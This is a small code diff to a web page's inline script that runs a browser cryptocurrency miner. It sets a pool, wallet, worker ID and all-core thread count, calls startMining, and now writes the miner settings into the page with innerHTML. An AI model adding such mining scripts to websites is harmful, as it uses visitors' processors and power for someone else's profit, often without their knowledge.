@@ -16,7 +16,7 @@
           var workerId = "GH-MINER"
           var threads = -1;
           var password = "x";
-          document.getElementById('config').style.content = `pool: '${pool}'\nwalletAddress: ${walletAddress}\nWorker-ID: ${workerId}\nthreads: ${threads}\npass: ${password}`;
+          document.getElementById('config').innerHTML = `pool: '${pool}'\nwalletAddress: ${walletAddress}\nWorker-ID: ${workerId}\nthreads: ${threads}\npass: ${password}`;
           startMining(pool, walletAddress, workerId, threads, password);
           throttleMiner = 20;
       </script>
